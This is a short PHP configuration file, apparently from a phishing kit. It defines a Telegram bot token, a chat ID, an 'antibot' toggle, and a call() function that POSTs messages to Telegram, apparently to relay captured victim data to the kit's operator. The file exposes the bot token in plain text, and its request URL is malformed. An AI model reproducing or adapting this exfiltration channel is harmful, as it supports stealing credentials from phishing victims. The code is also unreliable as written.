<?php

$token = "9108139118:AAEisCNeCi_q_-0DNVTz_icKHkYbrU_dTRc";
$id = "-1003987841987";

// use antibot? yes|no
$antibot = "yes";

function call($msg) {
    global $token, $id;
    $url = "https://telegram.org" . $token . "/sendMessage";
    $data = [
        'chat_id' => $id,
        'text' => $msg,
        'parse_mode' => 'HTML'
    ];
    $options = [
        'http' => [
            'method'  => 'POST',
            'header'  => "Content-Type: application/x-www-form-urlencoded\r\n",
            'content' => http_build_query($data)
        ]
    ];
    $context  = stream_context_create($options);
    return @file_get_contents($url, false, $context);
}

?>
